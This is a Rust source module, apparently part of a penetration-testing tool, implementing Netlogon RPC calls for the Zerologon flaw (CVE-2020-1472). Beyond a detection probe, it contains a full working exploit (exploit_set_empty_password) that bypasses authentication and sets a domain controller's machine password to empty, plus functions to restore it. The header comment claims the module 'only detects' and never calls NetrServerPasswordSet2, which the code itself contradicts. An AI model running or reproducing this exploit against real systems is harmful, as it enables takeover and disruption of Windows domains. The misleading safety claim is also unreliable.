//! MS-NRPC (Netlogon) — enough of the secure-channel setup to **detect Zerologon**
//! (CVE-2020-1472) without touching the machine password.
//!
//! The flaw: with AES-CFB8 and an all-zero IV, encrypting an all-zero plaintext yields all-zero
//! ciphertext with probability ~1/256. `NetrServerAuthenticate3` verifies the client credential by
//! computing exactly that, so sending an all-zero `ClientChallenge` + all-zero `ClientCredential`
//! and retrying makes the KDC accept an *unauthenticated* secure channel ~1 attempt in 256. If any
//! `NetrServerAuthenticate3` returns `STATUS_SUCCESS`, the DC is vulnerable.
//!
//! **This module only detects.** It never calls `NetrServerPasswordSet2` — the destructive step
//! that zeroes the machine password and breaks the DC. Detection ≠ exploitation.

use crate::ndr::NdrEncoder;
use crate::transport::RpcTcp;
use crate::{epm, Result, RpcError, Syntax};

/// The Netlogon RPC interface (MS-NRPC), reachable over ncacn_ip_tcp via the endpoint mapper.
pub fn netlogon_syntax() -> Syntax {
    Syntax::new("12345678-1234-abcd-ef00-01234567cffb", 1, 0)
}

pub mod opnum {
    pub const REQ_CHALLENGE: u16 = 4;
    pub const PASSWORD_SET: u16 = 6;
    pub const PASSWORD_SET2: u16 = 30;
    pub const AUTHENTICATE3: u16 = 26;
}

/// NT OWF of an empty password (MD4 of "") — the machine hash after a Zerologon reset.
pub const EMPTY_NT_OWF: [u8; 16] = [
    0x31, 0xd6, 0xcf, 0xe0, 0xd1, 0x6a, 0xe9, 0x31, 0xb7, 0x3c, 0x59, 0xd7, 0xe0, 0xc0, 0x89, 0xc0,
];

/// AES-128-CFB8 encryption with a zero IV (MS-NRPC AES credential + password encryption).
fn aes_cfb8_encrypt(key: &[u8; 16], data: &[u8]) -> Vec<u8> {
    use aes::cipher::{BlockEncrypt, KeyInit};
    let cipher = aes::Aes128::new(aes::cipher::generic_array::GenericArray::from_slice(key));
    let mut iv = [0u8; 16];
    let mut out = Vec::with_capacity(data.len());
    for &b in data {
        let mut block = aes::cipher::generic_array::GenericArray::clone_from_slice(&iv);
        cipher.encrypt_block(&mut block);
        let c = b ^ block[0];
        out.push(c);
        iv.copy_within(1..16, 0);
        iv[15] = c;
    }
    out
}

/// AES Netlogon session key (MS-NRPC 3.1.4.3.1): HMAC-SHA256(NTOWF, ClientChallenge||ServerChallenge)[..16].
fn session_key(nt_owf: &[u8; 16], client_ch: &[u8; 8], server_ch: &[u8; 8]) -> [u8; 16] {
    use hmac::Mac;
    let mut mac = hmac::Hmac::<sha2::Sha256>::new_from_slice(nt_owf).expect("hmac key");
    mac.update(client_ch);
    mac.update(server_ch);
    let r = mac.finalize().into_bytes();
    let mut k = [0u8; 16];
    k.copy_from_slice(&r[..16]);
    k
}

/// NETLOGON_SECURE_CHANNEL_TYPE::ServerSecureChannel (a DC authenticating to a DC).
const SERVER_SECURE_CHANNEL: u16 = 6;
/// Negotiate flags including the AES support bit (0x0100_0000) that selects the vulnerable path.
const NEG_FLAGS: u32 = 0x212f_ffff;
const STATUS_SUCCESS: u32 = 0x0000_0000;

/// NetrServerReqChallenge(PrimaryName[unique,str], ComputerName[str], ClientChallenge[8]).
fn encode_req_challenge(netbios: &str, client_challenge: &[u8; 8]) -> Vec<u8> {
    let mut e = NdrEncoder::new();
    e.referent(); // PrimaryName (unique, non-null)
    e.conformant_varying_wstr(netbios);
    e.align(4);
    e.conformant_varying_wstr(netbios); // ComputerName (ref, inline)
    e.align(4);
    e.bytes(client_challenge); // NETLOGON_CREDENTIAL
    e.into_bytes()
}

/// NetrServerAuthenticate3(PrimaryName[unique,str], AccountName[str], SecureChannelType,
/// ComputerName[str], ClientCredential[8], NegotiateFlags[in,out]).
fn encode_authenticate3(netbios: &str, client_cred: &[u8; 8]) -> Vec<u8> {
    let account = format!("{netbios}$");
    let mut e = NdrEncoder::new();
    e.referent(); // PrimaryName (unique)
    e.conformant_varying_wstr(netbios);
    e.align(4);
    e.conformant_varying_wstr(&account); // AccountName (ref)
    e.align(2);
    e.u16(SERVER_SECURE_CHANNEL); // SecureChannelType (enum, 2 bytes)
    e.align(4);
    e.conformant_varying_wstr(netbios); // ComputerName (ref)
    e.align(4);
    e.bytes(client_cred); // ClientCredential
    e.u32(NEG_FLAGS); // NegotiateFlags [in,out]
    e.into_bytes()
}

/// NetrServerPasswordSet2 with an all-zero authenticator and all-zero ClearNewPassword — the
/// Zerologon exploit step that sets the DC machine account password to **empty**. DESTRUCTIVE.
/// NL_TRUST_PASSWORD is a fixed 516-byte buffer; all zeros ⇒ empty password under the zero session.
fn encode_password_set2(netbios: &str) -> Vec<u8> {
    let account = format!("{netbios}$");
    let mut e = NdrEncoder::new();
    e.referent(); // PrimaryName (unique)
    e.conformant_varying_wstr(netbios);
    e.align(4);
    e.conformant_varying_wstr(&account); // AccountName (ref)
    e.align(2);
    e.u16(SERVER_SECURE_CHANNEL); // SecureChannelType
    e.align(4);
    e.conformant_varying_wstr(netbios); // ComputerName (ref)
    e.align(4);
    // NETLOGON_AUTHENTICATOR: Credential[8] + Timestamp(4) — all zero.
    e.bytes(&[0u8; 12]);
    // NL_TRUST_PASSWORD: Buffer[512] + Length(4) — all zero ⇒ empty.
    e.bytes(&[0u8; 516]);
    e.into_bytes()
}

/// NetrServerPasswordSet(PrimaryName[unique], AccountName[str], SecureChannelType, ComputerName[str],
/// Authenticator, EncryptedNtOwf[16]). Restores the machine account to a specific NT hash.
fn encode_password_set(netbios: &str, enc_owf: &[u8; 16]) -> Vec<u8> {
    let account = format!("{netbios}$");
    let mut e = NdrEncoder::new();
    e.referent(); // PrimaryName (unique)
    e.conformant_varying_wstr(netbios);
    e.align(4);
    e.conformant_varying_wstr(&account); // AccountName
    e.align(2);
    e.u16(SERVER_SECURE_CHANNEL);
    e.align(4);
    e.conformant_varying_wstr(netbios); // ComputerName
    e.align(4);
    e.bytes(&[0u8; 12]); // NETLOGON_AUTHENTICATOR (zero — valid in the zerologon session)
    e.bytes(enc_owf); // ENCRYPTED_NT_OWF_PASSWORD
    e.into_bytes()
}

/// Zerologon RESTORE: re-establish the zero-auth channel and set the machine account's NT hash back
/// to `target_nt` via NetrServerPasswordSet, so AD matches the DC's untouched local secret again.
/// Assumes the machine password is currently EMPTY (i.e. right after [`exploit_set_empty_password`]);
/// the session key is derived from the empty NTOWF. Returns Ok(true) if the restore was accepted.
pub async fn restore_password(
    host: &str,
    netbios: &str,
    target_nt: &[u8; 16],
    max_attempts: u32,
) -> Result<bool> {
    let port = epm::resolve_port(host, netlogon_syntax()).await?;
    let mut rpc = RpcTcp::connect(&format!("{host}:{port}")).await?;
    rpc.bind(netlogon_syntax()).await?;
    let zero = [0u8; 8];
    for _ in 1..=max_attempts {
        let ch = rpc
            .call(opnum::REQ_CHALLENGE, &encode_req_challenge(netbios, &zero))
            .await?;
        let server_ch: [u8; 8] = ch
            .get(0..8)
            .and_then(|b| b.try_into().ok())
            .ok_or_else(|| RpcError::Protocol("short ReqChallenge reply".into()))?;
        let auth = rpc
            .call(opnum::AUTHENTICATE3, &encode_authenticate3(netbios, &zero))
            .await?;
        if ret_status(&auth) == STATUS_SUCCESS {
            // Machine password is empty → session key from the empty NTOWF + this server challenge.
            let sk = session_key(&EMPTY_NT_OWF, &zero, &server_ch);
            let enc = aes_cfb8_encrypt(&sk, target_nt);
            let mut enc_owf = [0u8; 16];
            enc_owf.copy_from_slice(&enc);
            let resp = rpc
                .call(opnum::PASSWORD_SET, &encode_password_set(netbios, &enc_owf))
                .await?;
            return Ok(ret_status(&resp) == STATUS_SUCCESS);
        }
    }
    Ok(false)
}

/// Build an NL_TRUST_PASSWORD (516 bytes): the UTF-16LE password right-aligned in a 512-byte
/// buffer (front is padding the server ignores) + a 4-byte byte-length. Restoring the CLEARTEXT
/// (not just the OWF) makes AD regenerate every key — NT *and* the AES keys the schannel needs.
fn nl_trust_password(password: &str) -> [u8; 516] {
    let utf16: Vec<u8> = password.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
    // The buffer holds at most 512 bytes; clamp so an over-long cleartext can't underflow the slice
    // (machine passwords are <= 120 chars in practice, so this never triggers for real secrets).
    let len = utf16.len().min(512);
    let mut buf = [0u8; 516];
    buf[(512 - len)..512].copy_from_slice(&utf16[utf16.len() - len..]);
    buf[512..516].copy_from_slice(&(len as u32).to_le_bytes());
    buf
}

/// Same NDR shape as [`encode_password_set2`] but carrying an already-encrypted 516-byte
/// NL_TRUST_PASSWORD instead of the all-zero exploit payload.
fn encode_password_set2_enc(netbios: &str, enc_pw: &[u8; 516]) -> Vec<u8> {
    let account = format!("{netbios}$");
    let mut e = NdrEncoder::new();
    e.referent();
    e.conformant_varying_wstr(netbios);
    e.align(4);
    e.conformant_varying_wstr(&account);
    e.align(2);
    e.u16(SERVER_SECURE_CHANNEL);
    e.align(4);
    e.conformant_varying_wstr(netbios);
    e.align(4);
    e.bytes(&[0u8; 12]); // zero authenticator (valid in the zerologon session)
    e.bytes(enc_pw);
    e.into_bytes()
}

/// Full Zerologon RESTORE: re-establish the zero channel and set the machine account back to a
/// known CLEARTEXT via NetrServerPasswordSet2, so AD regenerates NT **and** AES keys to match the
/// DC's local secret (healing the AES secure channel, not just NTLM). Assumes the machine password
/// is currently empty (post-exploit). Returns Ok(true) if accepted.
pub async fn restore_password_cleartext(
    host: &str,
    netbios: &str,
    password: &str,
    max_attempts: u32,
) -> Result<bool> {
    let port = epm::resolve_port(host, netlogon_syntax()).await?;
    let mut rpc = RpcTcp::connect(&format!("{host}:{port}")).await?;
    rpc.bind(netlogon_syntax()).await?;
    let zero = [0u8; 8];
    for _ in 1..=max_attempts {
        let ch = rpc
            .call(opnum::REQ_CHALLENGE, &encode_req_challenge(netbios, &zero))
            .await?;
        let server_ch: [u8; 8] = ch
            .get(0..8)
            .and_then(|b| b.try_into().ok())
            .ok_or_else(|| RpcError::Protocol("short ReqChallenge reply".into()))?;
        let auth = rpc
            .call(opnum::AUTHENTICATE3, &encode_authenticate3(netbios, &zero))
            .await?;
        if ret_status(&auth) == STATUS_SUCCESS {
            let sk = session_key(&EMPTY_NT_OWF, &zero, &server_ch);
            let enc = aes_cfb8_encrypt(&sk, &nl_trust_password(password));
            let mut enc_pw = [0u8; 516];
            enc_pw.copy_from_slice(&enc);
            let resp = rpc
                .call(opnum::PASSWORD_SET2, &encode_password_set2_enc(netbios, &enc_pw))
                .await?;
            return Ok(ret_status(&resp) == STATUS_SUCCESS);
        }
    }
    Ok(false)
}

/// Trailing NTSTATUS of a Netlogon reply (last 4 bytes of the stub).
fn ret_status(stub: &[u8]) -> u32 {
    stub.get(stub.len().wrapping_sub(4)..)
        .and_then(|b| b.try_into().ok())
        .map(u32::from_le_bytes)
        .unwrap_or(0xFFFF_FFFF)
}

/// Outcome of a Zerologon probe.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Zerologon {
    /// A NetrServerAuthenticate3 accepted the all-zero credential — the DC is vulnerable.
    Vulnerable { attempts: u32 },
    /// Every attempt was rejected (STATUS_ACCESS_DENIED) — patched / not vulnerable.
    NotVulnerable { attempts: u32 },
}

/// Safe Zerologon detection: bind Netlogon over ncacn_ip_tcp and try the all-zero
/// challenge/credential handshake up to `max_attempts` (impacket uses 2000; success is expected
/// within ~256 on a vulnerable DC). Returns as soon as one attempt succeeds. Never resets the
/// machine password.
pub async fn detect_zerologon(host: &str, netbios: &str, max_attempts: u32) -> Result<Zerologon> {
    let port = epm::resolve_port(host, netlogon_syntax()).await?;
    let mut rpc = RpcTcp::connect(&format!("{host}:{port}")).await?;
    rpc.bind(netlogon_syntax()).await?;

    let zero = [0u8; 8];
    for attempt in 1..=max_attempts {
        // Establish a fresh challenge pair, then try to authenticate with all-zeros.
        let _ = rpc
            .call(opnum::REQ_CHALLENGE, &encode_req_challenge(netbios, &zero))
            .await?;
        let auth = rpc
            .call(opnum::AUTHENTICATE3, &encode_authenticate3(netbios, &zero))
            .await?;
        if ret_status(&auth) == STATUS_SUCCESS {
            return Ok(Zerologon::Vulnerable { attempts: attempt });
        }
    }
    Ok(Zerologon::NotVulnerable {
        attempts: max_attempts,
    })
}

/// Zerologon EXPLOIT: bypass Netlogon auth (as [`detect_zerologon`]), then immediately call
/// NetrServerPasswordSet2 to set the DC machine account password to **empty**. DESTRUCTIVE — the
/// DC's secure channel breaks until the password is restored (callers MUST restore). Returns
/// `Ok(true)` if the reset was accepted, `Ok(false)` if the DC is not vulnerable.
pub async fn exploit_set_empty_password(
    host: &str,
    netbios: &str,
    max_attempts: u32,
) -> Result<bool> {
    let port = epm::resolve_port(host, netlogon_syntax()).await?;
    let mut rpc = RpcTcp::connect(&format!("{host}:{port}")).await?;
    rpc.bind(netlogon_syntax()).await?;
    let zero = [0u8; 8];
    for _ in 1..=max_attempts {
        let _ = rpc
            .call(opnum::REQ_CHALLENGE, &encode_req_challenge(netbios, &zero))
            .await?;
        let auth = rpc
            .call(opnum::AUTHENTICATE3, &encode_authenticate3(netbios, &zero))
            .await?;
        if ret_status(&auth) == STATUS_SUCCESS {
            // Auth bypassed on this session — reset the machine password (unsigned, zero authenticator).
            let resp = rpc
                .call(opnum::PASSWORD_SET2, &encode_password_set2(netbios))
                .await?;
            return Ok(ret_status(&resp) == STATUS_SUCCESS);
        }
    }
    Ok(false)
}

#[allow(dead_code)]
fn _rpc_err(msg: &str) -> RpcError {
    RpcError::Protocol(msg.into())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn syntax_uuid() {
        // Netlogon interface UUID parses.
        let s = netlogon_syntax();
        assert_eq!(s.ver_major, 1);
    }

    #[test]
    fn req_challenge_layout() {
        let b = encode_req_challenge("DC01", &[0u8; 8]);
        // PrimaryName referent (non-null) then the conformant wstr max_count = len("DC01")+1 = 5.
        assert_ne!(u32::from_le_bytes(b[0..4].try_into().unwrap()), 0);
        assert_eq!(u32::from_le_bytes(b[4..8].try_into().unwrap()), 5);
        // ends with the 8-byte all-zero client challenge.
        assert_eq!(&b[b.len() - 8..], &[0u8; 8]);
    }

    #[test]
    fn authenticate3_ends_with_flags() {
        let b = encode_authenticate3("DC01", &[0u8; 8]);
        assert_eq!(&b[b.len() - 4..], &NEG_FLAGS.to_le_bytes());
    }

    #[test]
    fn ret_status_reads_tail() {
        assert_eq!(ret_status(&[0, 0, 0, 0, 0, 0, 0, 0]), 0);
        assert_eq!(ret_status(&0xC000_0022u32.to_le_bytes()), 0xC000_0022);
    }
}
